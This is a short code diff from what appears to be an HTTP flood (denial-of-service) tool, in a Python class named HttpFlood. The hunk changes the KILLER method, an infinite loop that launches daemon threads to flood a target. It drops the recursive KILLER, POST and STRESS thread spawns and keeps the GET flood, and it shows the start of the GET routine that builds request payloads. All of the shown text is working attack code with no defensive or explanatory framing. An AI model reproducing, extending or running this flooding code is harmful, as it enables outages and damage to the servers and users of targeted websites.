@@ -4633,11 +4633,7 @@ class HttpFlood(Thread):
 
     def KILLER(self) -> None:
         while True:
-            Thread(target=self.KILLER, daemon=True).start()
             Thread(target=self.GET, daemon=True).start()
-            Thread(target=self.POST, daemon=True).start()
-            Thread(target=self.STRESS, daemon=True).start()
-
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
